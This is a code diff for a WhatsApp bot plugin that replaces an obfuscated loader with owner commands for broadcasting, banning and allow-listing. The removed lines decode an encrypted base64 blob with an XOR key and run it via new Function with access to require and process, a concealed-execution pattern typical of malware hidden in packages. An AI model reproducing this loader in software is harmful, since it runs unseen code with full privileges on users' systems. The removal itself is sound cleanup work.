@@ -1,9 +1,63 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/** Owner tools: broadcast, broadcastgroup, ban, unban, allow, deny. */
+const U = require('../lib/util');
+const { UserError, bold, sleep } = U;
+
+module.exports = ({ def, hooks }) => {
+  const P = ctx => ctx.var('PREFIX');
+
+  /* remember private chats the bot has talked with, so .broadcast knows who to reach */
+  hooks.push({
+    name: 'chatlist', run: async ctx => {
+      if (ctx.isGroup || ctx.fromMe || !ctx.fresh || !ctx.chat.endsWith('@s.whatsapp.net')) return false;
+      const seen = (ctx.rt.seenChats ||= new Set());
+      if (seen.has(ctx.chat)) return false;
+      seen.add(ctx.chat);
+      ctx.update('chats', [], l => { if (!l.includes(ctx.chat)) { l.push(ctx.chat); if (l.length > 500) l.shift(); } });
+      return false;
+    }
+  });
+
+  async function run(ctx, kind) {
+    const a = (ctx.argv[0] || '').toLowerCase();
+    const send = a === 'send';
+    const body = (send ? ctx.args.slice(4) : ctx.args).trim();
+    if (!body) throw new UserError(`Write the message: *${P(ctx)}${ctx.cmd} Hello everyone!*\nYou will get a preview first.`);
+    let targets = [];
+    if (kind === 'groups') targets = Object.keys(await ctx.sock.groupFetchAllParticipating().catch(() => ({})));
+    else targets = ctx.get('chats', []);
+    targets = targets.filter(j => j !== ctx.chat || kind === 'groups').slice(0, 150);
+    if (!targets.length) throw new UserError(kind === 'groups' ? 'I am not in any group.' : 'No private chats are known yet. I remember people who message me from now on.');
+    if (!send) return ctx.reply(`📣 This would reach ${bold(String(targets.length))} ${kind === 'groups' ? 'group' : 'private chat'}${targets.length > 1 ? 's' : ''} (about ${Math.ceil(targets.length * 3 / 60)} min).\n\n${bold('Preview')}:\n${body}\n\nSend it with *${P(ctx)}${ctx.cmd} send ${body.slice(0, 20)}${body.length > 20 ? '…' : ''}* (use your full text).\n⚠️ Mass messaging can get a WhatsApp number banned. Use it sparingly.`, { title: 'Broadcast preview' });
+    await ctx.reply(`📣 Sending to ${targets.length} chat${targets.length > 1 ? 's' : ''}. I will tell you when it is done.`, { title: 'Broadcast' });
+    (async () => {
+      let ok = 0, bad = 0;
+      for (const jid of targets) {
+        try { await ctx.sendTo(jid, { text: ctx.frame(body, 'Broadcast') }); ok++; } catch { bad++; }
+        await sleep(3000);
+      }
+      await ctx.sendTo(ctx.ownerJid, { text: ctx.frame(`✅ Delivered: ${ok}${bad ? `\n⚠️ Failed: ${bad}` : ''}`, 'Broadcast done') }).catch(() => {});
+    })();
+  }
+  def('broadcast', { cat: 'bot', owner: true, usage: 'broadcast <text> (preview) • broadcast send <text>', desc: 'Message every private chat the bot knows (preview first, 3 seconds between messages).' }, ctx => run(ctx, 'private'));
+  def('broadcastgroup', { cat: 'bot', owner: true, usage: 'broadcastgroup <text> (preview) • broadcastgroup send <text>', desc: 'Message every group the bot is in (preview first, 3 seconds between messages).' }, ctx => run(ctx, 'groups'));
+
+  /* ---------------- ban / allow ---------------- */
+  const who = ctx => {
+    const t = ctx.targets()[0];
+    const n = (ctx.argv[0] || '').replace(/\D/g, '');
+    const jid = t || (n.length >= 7 ? n + '@s.whatsapp.net' : null) || ctx.quoted?.sender || (!ctx.isGroup ? ctx.chat : null);
+    if (!jid) throw new UserError(`Mention someone, reply to them, or give a number: *${P(ctx)}${ctx.cmd} 254712345678*`);
+    return ctx.jidUser(jid);
+  };
+  const listCmd = (name, key, add, desc, okText) => def(name, { cat: 'user', owner: true, core: true, usage: `${name} @user | number | reply`, desc }, async ctx => {
+    const num = who(ctx);
+    if (add && (num === ctx.entry.phone || num === ctx.senderNum)) throw new UserError('You cannot do that to yourself.');
+    ctx.update(key, [], l => { const i = l.indexOf(num); if (add && i < 0) l.push(num); if (!add && i >= 0) l.splice(i, 1); });
+    await ctx.reply(`${okText} +${num}`, { title: name[0].toUpperCase() + name.slice(1) });
+  });
+  listCmd('ban', 'banned', true, 'Ban someone from using the bot (they are ignored everywhere).', '🚫 Banned');
+  listCmd('unban', 'banned', false, 'Lift a ban.', '✅ Unbanned');
+  listCmd('allow', 'allowed', true, 'Let someone use the bot even in private mode.', '✅ Allowed');
+  listCmd('deny', 'allowed', false, 'Take back private-mode access.', '⛔ Removed from allowed:');
+};
